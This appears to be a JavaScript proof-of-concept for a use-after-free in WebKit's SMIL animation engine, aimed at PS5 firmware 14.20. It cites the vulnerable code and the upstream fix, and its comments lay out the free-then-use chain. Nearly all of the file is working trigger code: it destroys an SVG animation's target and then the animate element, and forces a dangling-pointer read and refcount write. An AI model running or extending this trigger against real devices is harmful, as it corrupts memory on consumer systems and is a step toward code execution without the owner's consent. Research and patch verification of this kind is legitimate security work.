// p493-smil-schedule-uaf.js
//
// PoC: use-after-free in the SMIL animation engine's schedule table.
//
// Target: PS5 14.20 (WebKit-1200).  CONFIRMED present in the shipped tree and
//         FIXED upstream by WebKit bug 302916 (commit 5e1cddb4e2bf, 2025-11-22).
//
// Vulnerable code (WebCore/svg/animation/SMILTimeContainer.h:75):
//     using AnimationsVector = Vector<SVGSMILElement*>;      <-- raw pointer
// upstream fix:
//     using AnimationsVector = Vector<WeakRef<SVGSMILElement, WeakPtrImplWithEventTargetData>>;
//
// Chain:
//   1. SVGSMILElement.h:187   WeakPtr<SVGElement,...> m_targetElement  (nulled when target dies)
//   2. SVGSMILElement.cpp:642  if (m_targetElement) m_timeContainer->unschedule(...)
//                              ^ unschedule is SKIPPED once the target is gone
//   3. SVGSMILElement.cpp:298  removedFromAncestor() -> setTargetElement(nullptr) [skip 2]
//                                         -> m_timeContainer = nullptr   [destructor can't unschedule]
//   4. SMILTimeContainer.cpp:253  for (auto* animation : animations) callback(*animation);   UAF READ
//   5. SMILTimeContainer.cpp:291  firstAnimation = animation;  -> animation->ref()             UAF WRITE
//
// Expected on PS5 14.20: SIGSEGV / heap corruption, no P493-DONE beacon.
// Expected on patched WebKit: P493-DONE.

(function () {
    function beacon(s) {
        try { if (window.__beacon) window.__beacon(s); } catch (e) {}
        try { document.title = s; } catch (e) {}
    }

    beacon("P493-START");

    var NS = "http://www.w3.org/2000/svg";
    var svg = document.createElementNS(NS, "svg");
    svg.setAttribute("width", "200");
    svg.setAttribute("height", "200");

    // <g> holding the animation TARGET
    var gTarget = document.createElementNS(NS, "g");
    gTarget.setAttribute("id", "gTarget");
    var target = document.createElementNS(NS, "circle");
    target.setAttribute("id", "tgt");
    target.setAttribute("cx", "10");
    target.setAttribute("cy", "10");
    target.setAttribute("r", "5");
    gTarget.appendChild(target);

    // <g> holding the <animate> element
    var gAnim = document.createElementNS(NS, "g");
    gAnim.setAttribute("id", "gAnim");
    var anim = document.createElementNS(NS, "animate");
    anim.setAttribute("id", "anim");
    anim.setAttribute("attributeName", "r");
    anim.setAttribute("href", "#tgt");
    anim.setAttribute("xlink:href", "#tgt");
    anim.setAttribute("dur", "10s");
    anim.setAttribute("repeatCount", "indefinite");
    anim.setAttribute("fill", "freeze");
    gAnim.appendChild(anim);

    svg.appendChild(gTarget);
    svg.appendChild(gAnim);
    document.body.appendChild(svg);

    // Give the SMIL engine a tick to schedule the animation.
    setTimeout(function () {
        beacon("P493-SCHEDULED");

        // (1) Destroy the animation TARGET.  <circle id=tgt> is removed and, since
        //     we keep no JS reference to it, it is destroyed -> the WeakPtr
        //     m_targetElement becomes null.
        //     NOTE: do NOT hold a reference to `target` -- a live JS wrapper would
        //     keep the node alive and the WeakPtr would NOT be nulled.
        gTarget.textContent = "";

        // (2) Remove the <animate> element.  removedFromAncestor() ->
        //     setTargetElement(nullptr): `if (m_targetElement)` is now FALSE, so
        //     unschedule() is SKIPPED, and m_timeContainer is nulled so the
        //     destructor cannot unschedule either.
        //     <animate> is destroyed, but SMILTimeContainer::m_scheduledAnimations
        //     still holds the raw pointer to it, under key (dangling <circle>*, "r").
        gAnim.textContent = "";

        beacon("P493-TARGET-AND-ANIMATION-REMOVED");

        // (3) Deterministic trigger: SMILTimeContainer::setElapsed() ->
        //     processScheduledAnimations() -> callback(*animation) on a FREED
        //     SVGSMILElement  =>  UAF read
        //                  -> updateAnimations() -> firstAnimation = animation
        //                     -> RefPtr::operator=(T*) -> animation->ref()
        //                     =>  UAF WRITE (refcount increment into freed memory)
        try {
            svg.setCurrentTime(svg.getCurrentTime() + 0.5);
        } catch (e) {
            beacon("P493-SETCURRENTTIME-THREW");
        }

        // Fallback trigger if setCurrentTime() is not honoured: let the SMIL timer
        // tick (a second, healthy <animate> keeps earliestFireTime finite).
        try {
            var keep = document.createElementNS(NS, "animate");
            keep.setAttribute("attributeName", "cx");
            keep.setAttribute("href", "#tgt");
            keep.setAttribute("dur", "2s");
            keep.setAttribute("repeatCount", "indefinite");
            svg.appendChild(keep);
        } catch (e) {}

        setTimeout(function () {
            beacon("P493-DONE");
        }, 200);
    }, 100);
})();
